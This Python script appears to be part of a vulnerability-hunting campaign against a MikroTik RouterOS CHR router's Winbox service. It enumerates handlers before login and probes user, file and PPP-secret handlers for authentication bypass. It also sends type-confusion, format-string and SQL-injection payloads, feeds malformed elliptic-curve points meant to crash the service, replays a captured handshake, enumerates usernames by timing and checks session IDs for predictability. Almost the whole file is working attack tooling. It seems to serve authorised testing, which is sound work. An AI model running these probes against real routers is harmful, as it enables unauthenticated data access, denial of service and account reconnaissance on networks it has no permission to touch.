#!/usr/bin/env python3
"""
MikroTik RouterOS CHR 7.20.8 — Deep Winbox M2 Protocol Novel Finding Hunter
Phase 9, Script 3 of 6
Target: [REDACTED-INTERNAL-IP]:8291

Tests (~150):
  1. Handler enumeration (~50) — pre-auth handler ID scan 1-90
  2. Permission bitmap bypass (~30) — restricted handler access
  3. Type confusion (~30) — wrong value types for M2 fields
  4. EC-SRP5 analysis (~20) — auth handshake crypto analysis
  5. Session prediction (~20) — session ID entropy analysis

Evidence: evidence/novel_winbox_deep.json
"""

import hashlib
import json
import math
import os
import random
import socket
import struct
import sys
import time
import traceback
import warnings

warnings.filterwarnings("ignore")

sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik/scripts')
from mikrotik_common import *

ec = EvidenceCollector("novel_winbox_deep.py", phase=9)

WINBOX_PORT = 8291


# ── M2 Protocol Helpers ─────────────────────────────────────────────────────

def m2_encode_frame(body):
    """Encode a Winbox M2 frame: 2-byte big-endian length prefix + body."""
    return struct.pack('>H', len(body)) + body


def m2_encode_string(key_id, value):
    """Encode an M2 string TLV: type(1) + key_id(3) + len(2) + data."""
    data = value.encode('utf-8') if isinstance(value, str) else value
    return bytes([0x21]) + key_id.to_bytes(3, 'big') + struct.pack('>H', len(data)) + data


def m2_encode_u32(key_id, value):
    """Encode an M2 u32 TLV: type(1) + key_id(3) + value(4)."""
    return bytes([0x08]) + key_id.to_bytes(3, 'big') + struct.pack('<I', value)


def m2_encode_bool(key_id, value=True):
    """Encode an M2 bool TLV: type(1) + key_id(3)."""
    return bytes([0x00 if value else 0x01]) + key_id.to_bytes(3, 'big')


def m2_encode_raw(key_id, raw_bytes):
    """Encode an M2 raw bytes TLV."""
    return bytes([0x31]) + key_id.to_bytes(3, 'big') + struct.pack('>H', len(raw_bytes)) + raw_bytes


def m2_encode_u64(key_id, value):
    """Encode an M2 u64 TLV: type(1) + key_id(3) + value(8)."""
    return bytes([0x10]) + key_id.to_bytes(3, 'big') + struct.pack('<Q', value)


def winbox_connect(timeout=5):
    """Open a TCP connection to the Winbox port."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((TARGET, WINBOX_PORT))
    return s


def winbox_send_recv(data, timeout=5, recv_size=8192):
    """Connect, send M2 frame, receive response, close."""
    try:
        s = winbox_connect(timeout=timeout)
        s.sendall(data)
        time.sleep(0.3)
        try:
            resp = s.recv(recv_size)
        except socket.timeout:
            resp = b""
        s.close()
        return resp
    except Exception as e:
        return None


def parse_m2_response(data):
    """Basic M2 response parser — extract key-value pairs."""
    if not data or len(data) < 4:
        return {"raw_len": len(data) if data else 0, "raw_hex": data.hex()[:200] if data else ""}

    result = {
        "raw_len": len(data),
        "raw_hex": data.hex()[:400],
    }

    # Skip 2-byte length prefix if present
    try:
        frame_len = struct.unpack('>H', data[:2])[0]
        if frame_len == len(data) - 2:
            data = data[2:]
            result["frame_len"] = frame_len
    except Exception:
        pass

    # Try to extract TLV entries
    tlvs = []
    pos = 0
    while pos < len(data) - 3:
        try:
            type_byte = data[pos]
            key_id = int.from_bytes(data[pos+1:pos+4], 'big')

            if type_byte == 0x00:  # bool true
                tlvs.append({"type": "bool_true", "key": hex(key_id)})
                pos += 4
            elif type_byte == 0x01:  # bool false
                tlvs.append({"type": "bool_false", "key": hex(key_id)})
                pos += 4
            elif type_byte == 0x08:  # u32
                if pos + 8 <= len(data):
                    val = struct.unpack('<I', data[pos+4:pos+8])[0]
                    tlvs.append({"type": "u32", "key": hex(key_id), "value": val})
                    pos += 8
                else:
                    break
            elif type_byte == 0x10:  # u64
                if pos + 12 <= len(data):
                    val = struct.unpack('<Q', data[pos+4:pos+12])[0]
                    tlvs.append({"type": "u64", "key": hex(key_id), "value": val})
                    pos += 12
                else:
                    break
            elif type_byte in (0x21, 0x31):  # string / raw
                if pos + 6 <= len(data):
                    slen = struct.unpack('>H', data[pos+4:pos+6])[0]
                    if pos + 6 + slen <= len(data):
                        sval = data[pos+6:pos+6+slen]
                        tlvs.append({
                            "type": "string" if type_byte == 0x21 else "raw",
                            "key": hex(key_id),
                            "value": sval.decode('utf-8', errors='replace')[:200],
                            "length": slen,
                        })
                        pos += 6 + slen
                    else:
                        break
                else:
                    break
            else:
                # Unknown type, try to skip
                tlvs.append({"type": f"unknown_0x{type_byte:02x}", "key": hex(key_id)})
                pos += 4
        except Exception:
            break

    result["tlvs"] = tlvs
    result["tlv_count"] = len(tlvs)
    return result


def periodic_health(test_count):
    """Check router health every 10 tests."""
    if test_count % 10 == 0 and test_count > 0:
        h = check_router_alive()
        if not h.get("alive"):
            log("  Router unreachable! Waiting for recovery...")
            wait_for_router(max_wait=60)
            return False
    return True


# =============================================================================
# Section 1: Handler Enumeration (~50 tests)
# =============================================================================

def test_handler_enumeration():
    """Send M2 messages to handler IDs 1-90 pre-auth to map the handler landscape."""
    log("=" * 60)
    log("Section 1: Winbox Handler Enumeration (Pre-Auth)")
    log("=" * 60)

    test_count = 0
    handler_map = {}

    # Known Winbox M2 keys:
    # 0xff0001 = destination handler (SYS_TO)
    # 0xff0002 = command
    # 0xff0003 = request sequence
    # 0xff0006 = reply expected
    # 0xff0007 = session ID (post-auth)

    for handler_id in range(1, 91):
        test_count += 1
        periodic_health(test_count)

        try:
            # Build a basic M2 message targeting this handler
            body = b""
            body += m2_encode_u32(0xff0001, handler_id)   # SYS_TO = handler_id
            body += m2_encode_u32(0xff0002, 1)             # command = 1 (list/query)
            body += m2_encode_u32(0xff0003, test_count)    # request seq
            body += m2_encode_bool(0xff0006, True)         # reply expected

            frame = m2_encode_frame(body)
            resp = winbox_send_recv(frame, timeout=3)

            if resp is None:
                handler_map[handler_id] = {"status": "connection_failed"}
                ec.add_test(
                    "handler_enum", f"Handler {handler_id}",
                    f"Probe handler ID {handler_id} pre-auth",
                    "Connection failed",
                    {"handler_id": handler_id, "status": "connection_failed"},
                )
                continue

            parsed = parse_m2_response(resp)
            resp_len = len(resp)

            # Classify response
            if resp_len == 0:
                classification = "no_response"
            elif resp_len < 10:
                classification = "minimal_response"
            else:
                # Check for error indicators in TLVs
                has_error = any(
                    tlv.get("key") == "0xff0008" or
                    "error" in str(tlv.get("value", "")).lower()
                    for tlv in parsed.get("tlvs", [])
                )
                if has_error:
                    classification = "error_response"
                else:
                    classification = "data_response"

            handler_map[handler_id] = {
                "status": classification,
                "response_size": resp_len,
                "tlv_count": parsed.get("tlv_count", 0),
            }

            is_anomaly = classification == "data_response"
            ec.add_test(
                "handler_enum", f"Handler {handler_id}: {classification}",
                f"Probe handler ID {handler_id} pre-auth",
                f"Response: {resp_len} bytes, class={classification}, "
                f"tlvs={parsed.get('tlv_count', 0)}",
                {"handler_id": handler_id, "classification": classification,
                 "response_size": resp_len, "parsed": parsed},
                anomaly=is_anomaly,
            )

            if is_anomaly:
                ec.add_finding(
                    "MEDIUM",
                    f"Winbox handler {handler_id} responds with data pre-auth",
                    f"Handler ID {handler_id} returned {resp_len} bytes of data "
                    f"without authentication",
                    cwe="CWE-306",
                )

        except Exception as e:
            handler_map[handler_id] = {"status": "error", "error": str(e)}
            ec.add_test(
                "handler_enum", f"Handler {handler_id}",
                f"Probe handler {handler_id}", f"Error: {e}",
            )

        # Small delay to avoid overwhelming
        time.sleep(0.1)

    # Summary
    classifications = {}
    for hid, info in handler_map.items():
        status = info.get("status", "unknown")
        classifications[status] = classifications.get(status, 0) + 1

    responding_handlers = [
        hid for hid, info in handler_map.items()
        if info.get("status") in ("data_response", "error_response", "minimal_response")
    ]

    ec.add_test(
        "handler_enum", "Handler enumeration summary",
        f"Summary of handler ID scan (1-90)",
        f"Classifications: {classifications}, responding: {len(responding_handlers)}",
        {"handler_map": handler_map, "classifications": classifications,
         "responding_handlers": responding_handlers},
    )


# =============================================================================
# Section 2: Permission Bitmap Bypass (~30 tests)
# =============================================================================

def test_permission_bypass():
    """Test accessing restricted handlers with modified permission bits."""
    log("=" * 60)
    log("Section 2: Permission Bitmap Bypass")
    log("=" * 60)

    test_count = 0

    # Known handler IDs and their functions (from RouterOS documentation/RE):
    # 2 = login handler
    # 13 = system handler
    # 14 = interface handler
    # 15 = ip handler
    # 24 = user handler (sensitive)
    # 26 = file handler
    # 33 = certificate handler
    # 37 = log handler
    # 44 = ppp handler

    sensitive_handlers = [
        (2, "login", "Authentication handler"),
        (13, "system", "System management"),
        (14, "interface", "Interface management"),
        (15, "ip", "IP configuration"),
        (24, "user", "User management (sensitive)"),
        (26, "file", "File access"),
        (33, "certificate", "Certificate management"),
        (37, "log", "Log access"),
        (44, "ppp", "PPP/VPN secrets"),
    ]

    # Test each sensitive handler with different command IDs
    commands = [1, 2, 3, 4, 5, 6, 7, 0, 0xff]

    for handler_id, handler_name, handler_desc in sensitive_handlers:
        for cmd_id in commands:
            test_count += 1
            periodic_health(test_count)

            try:
                body = b""
                body += m2_encode_u32(0xff0001, handler_id)
                body += m2_encode_u32(0xff0002, cmd_id)
                body += m2_encode_u32(0xff0003, test_count)
                body += m2_encode_bool(0xff0006, True)

                frame = m2_encode_frame(body)
                resp = winbox_send_recv(frame, timeout=3)

                if resp is None:
                    continue

                parsed = parse_m2_response(resp)
                resp_len = len(resp)

                # Check if we got actual data back (not just an error)
                has_data = resp_len > 20 and parsed.get("tlv_count", 0) > 2
                ec.add_test(
                    "perm_bypass",
                    f"Handler {handler_id}/{handler_name} cmd={cmd_id}",
                    f"Pre-auth: {handler_desc} with command {cmd_id}",
                    f"Response: {resp_len} bytes, tlvs={parsed.get('tlv_count', 0)}",
                    {"handler_id": handler_id, "handler_name": handler_name,
                     "command": cmd_id, "response_size": resp_len,
                     "parsed": parsed},
                    anomaly=has_data,
                )

                if has_data:
                    ec.add_finding(
                        "HIGH",
                        f"Pre-auth data leak from {handler_name} handler (cmd={cmd_id})",
                        f"Handler {handler_id} ({handler_name}) returned {resp_len} bytes "
                        f"with {parsed.get('tlv_count', 0)} TLVs without authentication",
                        cwe="CWE-306", cvss=7.5,
                    )

            except Exception as e:
                ec.add_test(
                    "perm_bypass",
                    f"Handler {handler_id}/{handler_name} cmd={cmd_id}",
                    f"Permission bypass test", f"Error: {e}",
                )

            time.sleep(0.05)


# =============================================================================
# Section 3: Type Confusion (~30 tests)
# =============================================================================

def test_type_confusion():
    """Send wrong value types for known M2 keys to trigger type confusion."""
    log("=" * 60)
    log("Section 3: M2 Type Confusion")
    log("=" * 60)

    test_count = 0

    # Target: login handler (2) and system handler (13)
    target_handlers = [
        (2, "login"),
        (13, "system"),
    ]

    # Type confusion payloads: send wrong types for known keys
    # Key 0x01 = username (normally string)
    # Key 0x03 = session ID (normally u32)
    # Key 0x09 = password hash (normally raw bytes)

    type_tests = [
        # String where u32 expected
        ("string_as_u32_sys_to",
         m2_encode_string(0xff0001, "hello"),
         "String for SYS_TO (expects u32)"),

        # u32 where string expected
        ("u32_as_string_username",
         m2_encode_u32(0x01, 0xDEADBEEF),
         "u32 for username field (expects string)"),

        # Very large u32 for handler ID
        ("max_u32_handler",
         m2_encode_u32(0xff0001, 0xFFFFFFFF),
         "Max u32 for handler ID"),

        # Negative handler ID (signed interpretation)
        ("negative_handler",
         m2_encode_u32(0xff0001, 0x80000000),
         "Negative handler ID (signed overflow)"),

        # Zero handler
        ("zero_handler",
         m2_encode_u32(0xff0001, 0),
         "Zero handler ID"),

        # Raw bytes where u32 expected
        ("raw_as_u32",
         m2_encode_raw(0xff0001, b"\x41\x41\x41\x41\x41\x41\x41\x41"),
         "Raw bytes for SYS_TO field"),

        # Empty string for username
        ("empty_username",
         m2_encode_string(0x01, ""),
         "Empty string username"),

        # Very long username
        ("long_username",
         m2_encode_string(0x01, "A" * 10000),
         "10KB username string"),

        # Null bytes in string
        ("null_in_username",
         m2_encode_string(0x01, "admin\x00extra"),
         "Username with null byte"),

        # Boolean for handler ID (type mismatch)
        ("bool_as_handler",
         m2_encode_bool(0xff0001, True),
         "Boolean for handler ID"),

        # u64 for handler ID
        ("u64_handler",
         m2_encode_u64(0xff0001, 2),
         "u64 for handler ID (expects u32)"),

        # Nested M2 message as value
        ("nested_message",
         m2_encode_raw(0x01, m2_encode_string(0x01, "admin")),
         "Nested M2 message as username"),

        # Format string in username
        ("format_string_username",
         m2_encode_string(0x01, "%s%s%s%n%n%n"),
         "Format string in username"),

        # SQL injection in username
        ("sqli_username",
         m2_encode_string(0x01, "admin' OR '1'='1"),
         "SQL injection in username"),

        # Binary garbage as string
        ("binary_garbage_username",
         m2_encode_string(0x01, "\xff\xfe\xfd\xfc\xfb\xfa"),
         "Binary garbage as username"),
    ]

    for handler_id, handler_name in target_handlers:
        for test_name, type_tlv, description in type_tests:
            test_count += 1
            periodic_health(test_count)

            try:
                # Build body with the confused type
                body = type_tlv
                # Add command and sequence
                body += m2_encode_u32(0xff0002, 1)
                body += m2_encode_u32(0xff0003, test_count)
                body += m2_encode_bool(0xff0006, True)

                # If the type_tlv doesn't set SYS_TO, add it
                if 0xff0001.to_bytes(3, 'big') not in type_tlv:
                    body = m2_encode_u32(0xff0001, handler_id) + body

                frame = m2_encode_frame(body)
                resp = winbox_send_recv(frame, timeout=3)

                if resp is None:
                    # Connection reset could mean crash
                    h = check_router_alive()
                    if not h.get("alive"):
                        ec.add_finding(
                            "CRITICAL",
                            f"Winbox crash on type confusion: {test_name}",
                            f"Router became unresponsive after sending {description} "
                            f"to handler {handler_id} ({handler_name})",
                            cwe="CWE-843", cvss=9.8,
                        )
                        wait_for_router(max_wait=60)

                    ec.add_test(
                        "type_confusion",
                        f"Type: {test_name} → {handler_name}",
                        f"{description} → handler {handler_id}",
                        "No response (connection closed/reset)",
                        {"test": test_name, "handler": handler_name},
                        anomaly=True,
                    )
                    continue

                parsed = parse_m2_response(resp)
                ec.add_test(
                    "type_confusion",
                    f"Type: {test_name} → {handler_name}",
                    f"{description} → handler {handler_id}",
                    f"Response: {len(resp)} bytes, tlvs={parsed.get('tlv_count', 0)}",
                    {"test": test_name, "handler": handler_name,
                     "handler_id": handler_id,
                     "response_size": len(resp), "parsed": parsed},
                )

            except Exception as e:
                ec.add_test(
                    "type_confusion",
                    f"Type: {test_name} → {handler_name}",
                    f"Type confusion test", f"Error: {e}",
                )

            time.sleep(0.05)


# =============================================================================
# Section 4: EC-SRP5 Analysis (~20 tests)
# =============================================================================

def test_ec_srp5():
    """Analyze the EC-SRP5 authentication handshake."""
    log("=" * 60)
    log("Section 4: EC-SRP5 Authentication Analysis")
    log("=" * 60)

    test_count = 0

    # ── 4a: Capture auth handshake ───────────────────────────────────────────
    log("  Capturing authentication handshake...")
    handshakes = []

    for attempt in range(5):
        test_count += 1
        try:
            s = winbox_connect(timeout=5)

            # Send login initiation (handler 2, command for auth start)
            body = b""
            body += m2_encode_u32(0xff0001, 2)           # handler = login
            body += m2_encode_u32(0xff0002, 1)           # command = auth init
            body += m2_encode_u32(0xff0003, attempt + 1) # sequence
            body += m2_encode_bool(0xff0006, True)       # reply expected
            body += m2_encode_string(0x01, ADMIN_USER)   # username

            frame = m2_encode_frame(body)
            s.sendall(frame)
            time.sleep(0.5)

            try:
                resp = s.recv(8192)
                parsed = parse_m2_response(resp)
                handshakes.append({
                    "attempt": attempt + 1,
                    "response_size": len(resp),
                    "parsed": parsed,
                    "raw_hex": resp.hex()[:600],
                })
            except socket.timeout:
                handshakes.append({"attempt": attempt + 1, "status": "timeout"})

            s.close()
        except Exception as e:
            handshakes.append({"attempt": attempt + 1, "error": str(e)})

        time.sleep(0.2)

    ec.add_test(
        "ec_srp5", "Auth handshake capture (5 attempts)",
        "Capture 5 EC-SRP5 authentication handshake initiations",
        f"Captured {len(handshakes)} responses",
        {"handshakes": handshakes},
    )

    # ── 4b: Analyze curve parameters ─────────────────────────────────────────
    # Look for EC point data in responses
    ec_data_found = False
    for hs in handshakes:
        parsed = hs.get("parsed", {})
        for tlv in parsed.get("tlvs", []):
            if tlv.get("type") == "raw" and tlv.get("length", 0) >= 32:
                ec_data_found = True
                ec.add_test(
                    "ec_srp5", "EC point data detected",
                    "Analyze potential elliptic curve point in handshake",
                    f"Key={tlv['key']}, length={tlv['length']} bytes",
                    {"tlv": tlv},
                )

    if not ec_data_found:
        ec.add_test("ec_srp5", "EC point data",
                    "Search for EC point data in handshake",
                    "No raw TLVs >= 32 bytes found in handshake responses")

    # ── 4c: Test with malformed EC points ────────────────────────────────────
    malformed_points = [
        ("zero_point", b"\x00" * 32, "All-zero EC point"),
        ("one_point", b"\x01" + b"\x00" * 31, "EC point = (1, 0)"),
        ("max_point", b"\xff" * 32, "All-ones EC point"),
        ("small_order", b"\x00" * 16 + b"\x01" + b"\x00" * 15, "Potential small subgroup point"),
        ("identity", b"\x00" * 33, "EC identity point (33 bytes, compressed)"),
    ]

    for name, point_data, desc in malformed_points:
        test_count += 1
        periodic_health(test_count)

        try:
            body = b""
            body += m2_encode_u32(0xff0001, 2)
            body += m2_encode_u32(0xff0002, 4)   # auth response command
            body += m2_encode_u32(0xff0003, test_count)
            body += m2_encode_bool(0xff0006, True)
            body += m2_encode_raw(0x09, point_data)  # EC point / password hash

            frame = m2_encode_frame(body)
            resp = winbox_send_recv(frame, timeout=3)

            if resp is None:
                h = check_router_alive()
                if not h.get("alive"):
                    ec.add_finding(
                        "CRITICAL",
                        f"Winbox crash on malformed EC point: {name}",
                        f"Sending {desc} caused router to become unresponsive",
                        cwe="CWE-310", cvss=9.8,
                    )
                    wait_for_router(max_wait=60)

                ec.add_test("ec_srp5", f"Malformed EC: {name}",
                            f"Send {desc} to login handler",
                            "No response (crash or rejection)",
                            anomaly=True)
                continue

            parsed = parse_m2_response(resp)
            ec.add_test(
                "ec_srp5", f"Malformed EC: {name}",
                f"Send {desc} to login handler",
                f"Response: {len(resp)} bytes",
                {"name": name, "point_hex": point_data.hex(),
                 "response_size": len(resp), "parsed": parsed},
            )

        except Exception as e:
            ec.add_test("ec_srp5", f"Malformed EC: {name}",
                        f"Malformed EC point test", f"Error: {e}")

    # ── 4d: Auth replay test ─────────────────────────────────────────────────
    log("  Testing auth handshake replay...")
    if handshakes and handshakes[0].get("response_size", 0) > 0:
        # Try replaying the first handshake response
        first_raw = bytes.fromhex(handshakes[0].get("raw_hex", ""))
        if first_raw:
            try:
                s = winbox_connect(timeout=3)
                s.sendall(first_raw)
                time.sleep(0.5)
                try:
                    replay_resp = s.recv(8192)
                except socket.timeout:
                    replay_resp = b""
                s.close()

                ec.add_test("ec_srp5", "Auth replay test",
                            "Replay a captured handshake response to the server",
                            f"Response: {len(replay_resp)} bytes",
                            {"replay_size": len(first_raw),
                             "response_size": len(replay_resp),
                             "response_hex": replay_resp.hex()[:200] if replay_resp else ""})
            except Exception as e:
                ec.add_test("ec_srp5", "Auth replay",
                            "Auth replay test", f"Error: {e}")

    # ── 4e: Username enumeration via handshake ───────────────────────────────
    log("  Testing username enumeration via auth timing...")
    valid_times = []
    invalid_times = []

    for i in range(5):
        # Valid username
        start = time.perf_counter()
        try:
            body = b""
            body += m2_encode_u32(0xff0001, 2)
            body += m2_encode_u32(0xff0002, 1)
            body += m2_encode_u32(0xff0003, 1000 + i)
            body += m2_encode_bool(0xff0006, True)
            body += m2_encode_string(0x01, "admin")

            frame = m2_encode_frame(body)
            resp = winbox_send_recv(frame, timeout=3)
            elapsed = (time.perf_counter() - start) * 1000
            valid_times.append({"time_ms": round(elapsed, 2),
                                "resp_size": len(resp) if resp else 0})
        except Exception:
            elapsed = (time.perf_counter() - start) * 1000
            valid_times.append({"time_ms": round(elapsed, 2), "error": True})

        # Invalid username
        start = time.perf_counter()
        try:
            body = b""
            body += m2_encode_u32(0xff0001, 2)
            body += m2_encode_u32(0xff0002, 1)
            body += m2_encode_u32(0xff0003, 2000 + i)
            body += m2_encode_bool(0xff0006, True)
            body += m2_encode_string(0x01, f"nonexistent_{i}")

            frame = m2_encode_frame(body)
            resp = winbox_send_recv(frame, timeout=3)
            elapsed = (time.perf_counter() - start) * 1000
            invalid_times.append({"time_ms": round(elapsed, 2),
                                  "resp_size": len(resp) if resp else 0})
        except Exception:
            elapsed = (time.perf_counter() - start) * 1000
            invalid_times.append({"time_ms": round(elapsed, 2), "error": True})

        time.sleep(0.1)

    valid_avg = sum(t["time_ms"] for t in valid_times) / len(valid_times) if valid_times else 0
    invalid_avg = sum(t["time_ms"] for t in invalid_times) / len(invalid_times) if invalid_times else 0
    timing_diff = abs(valid_avg - invalid_avg)

    # Also check response size differences
    valid_sizes = set(t.get("resp_size", 0) for t in valid_times)
    invalid_sizes = set(t.get("resp_size", 0) for t in invalid_times)
    size_differs = valid_sizes != invalid_sizes

    ec.add_test(
        "ec_srp5", "Username enumeration via Winbox",
        "Compare auth timing/response for valid vs invalid usernames",
        f"Valid avg: {valid_avg:.2f}ms, Invalid avg: {invalid_avg:.2f}ms, "
        f"diff: {timing_diff:.2f}ms, sizes_differ: {size_differs}",
        {"valid_times": valid_times, "invalid_times": invalid_times,
         "valid_avg_ms": round(valid_avg, 2), "invalid_avg_ms": round(invalid_avg, 2),
         "timing_diff_ms": round(timing_diff, 2), "size_differs": size_differs,
         "valid_sizes": list(valid_sizes), "invalid_sizes": list(invalid_sizes)},
        anomaly=(timing_diff > 50 or size_differs),
    )

    if timing_diff > 50:
        ec.add_finding(
            "LOW",
            f"Winbox username enumeration via timing ({timing_diff:.1f}ms delta)",
            f"Valid username auth takes {valid_avg:.1f}ms vs {invalid_avg:.1f}ms for invalid",
            cwe="CWE-204",
        )
    if size_differs:
        ec.add_finding(
            "LOW",
            "Winbox username enumeration via response size",
            f"Valid username responses: {valid_sizes}, invalid: {invalid_sizes}",
            cwe="CWE-204",
        )


# =============================================================================
# Section 5: Session Prediction (~20 tests)
# =============================================================================

def test_session_prediction():
    """Analyze session IDs for predictability patterns."""
    log("=" * 60)
    log("Section 5: Winbox Session ID Prediction")
    log("=" * 60)

    test_count = 0

    # Collect 20 session-like values from handshake responses
    log("  Collecting 20 handshake responses for session analysis...")
    session_data = []

    for i in range(20):
        test_count += 1
        periodic_health(test_count)

        try:
            body = b""
            body += m2_encode_u32(0xff0001, 2)
            body += m2_encode_u32(0xff0002, 1)
            body += m2_encode_u32(0xff0003, 5000 + i)
            body += m2_encode_bool(0xff0006, True)
            body += m2_encode_string(0x01, ADMIN_USER)

            frame = m2_encode_frame(body)
            resp = winbox_send_recv(frame, timeout=3)

            if resp and len(resp) > 4:
                parsed = parse_m2_response(resp)
                # Extract any u32 or raw values that could be session IDs
                for tlv in parsed.get("tlvs", []):
                    if tlv.get("type") == "u32":
                        session_data.append({
                            "attempt": i + 1,
                            "key": tlv["key"],
                            "value": tlv["value"],
                            "type": "u32",
                        })
                    elif tlv.get("type") == "raw" and tlv.get("length", 0) >= 4:
                        session_data.append({
                            "attempt": i + 1,
                            "key": tlv["key"],
                            "value": tlv.get("value", "")[:40],
                            "type": "raw",
                            "length": tlv["length"],
                        })

        except Exception:
            pass

        time.sleep(0.15)

    ec.add_test(
        "session_predict", f"Collected {len(session_data)} session-like values",
        "Collect potential session identifiers from handshake responses",
        f"Found {len(session_data)} candidate values from 20 handshakes",
        {"session_data": session_data[:50]},
    )

    # Analyze patterns in u32 values
    u32_values = [s["value"] for s in session_data if s["type"] == "u32"]
    if u32_values:
        # Group by key
        by_key = {}
        for s in session_data:
            if s["type"] == "u32":
                key = s["key"]
                if key not in by_key:
                    by_key[key] = []
                by_key[key].append(s["value"])

        for key, values in by_key.items():
            if len(values) < 3:
                continue

            unique_count = len(set(values))
            all_unique = unique_count == len(values)

            # Check for sequential pattern
            sorted_vals = sorted(values)
            diffs = [sorted_vals[i+1] - sorted_vals[i]
                     for i in range(len(sorted_vals)-1)]
            is_sequential = all(d == diffs[0] for d in diffs) if diffs else False
            avg_diff = sum(diffs) / len(diffs) if diffs else 0

            # Entropy estimation
            # For u32 values: if all unique and spread across the range, entropy is good
            value_range = max(values) - min(values) if values else 0
            entropy_estimate = math.log2(value_range) if value_range > 0 else 0

            ec.add_test(
                "session_predict", f"Session analysis: key {key}",
                f"Analyze predictability of u32 values for key {key}",
                f"Values: {len(values)}, unique: {unique_count}, "
                f"sequential: {is_sequential}, entropy~{entropy_estimate:.1f} bits",
                {"key": key, "values": values[:20],
                 "unique_count": unique_count,
                 "all_unique": all_unique,
                 "is_sequential": is_sequential,
                 "avg_diff": round(avg_diff, 2),
                 "value_range": value_range,
                 "entropy_bits": round(entropy_estimate, 1)},
                anomaly=(is_sequential and len(values) >= 3),
            )

            if is_sequential and len(values) >= 3:
                ec.add_finding(
                    "MEDIUM",
                    f"Sequential Winbox session IDs (key {key})",
                    f"Values increment by {avg_diff:.0f} per request, "
                    f"making session prediction feasible",
                    cwe="CWE-330",
                )

    # Summary: overall session prediction risk
    ec.add_test(
        "session_predict", "Session prediction risk summary",
        "Overall assessment of Winbox session predictability",
        f"Analyzed {len(session_data)} values across {len(by_key) if 'by_key' in dir() else 0} keys",
        {"total_values": len(session_data)},
    )


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 60)
    log("MikroTik RouterOS CHR 7.20.8 — Deep Winbox M2 Protocol Hunting")
    log(f"Target: {TARGET}:{WINBOX_PORT}")
    log("Phase 9 — novel_winbox_deep.py")
    log("=" * 60)

    alive = check_router_alive()
    if not alive.get("alive"):
        log("FATAL: Router is not responding. Aborting.")
        return
    log(f"Router alive: version={alive.get('version')}, uptime={alive.get('uptime')}")

    # Verify Winbox port is open
    try:
        s = winbox_connect(timeout=3)
        s.close()
        log(f"Winbox port {WINBOX_PORT} is open.")
    except Exception as e:
        log(f"WARNING: Winbox port {WINBOX_PORT} not reachable: {e}")
        log("Continuing anyway — some tests may fail.")

    try:
        test_handler_enumeration()    # ~50 tests
        test_permission_bypass()      # ~30 tests
        test_type_confusion()         # ~30 tests
        test_ec_srp5()                # ~20 tests
        test_session_prediction()     # ~20 tests

    except KeyboardInterrupt:
        log("Interrupted by user.")
    except Exception as e:
        log(f"Unhandled exception: {e}")
        traceback.print_exc()
    finally:
        final = check_router_alive()
        log(f"Final health: {final}")

        ec.save("novel_winbox_deep.json")
        ec.summary()


if __name__ == "__main__":
    os.chdir("/home/[REDACTED]/Desktop/[REDACTED-PATH]/MikroTik")
    main()
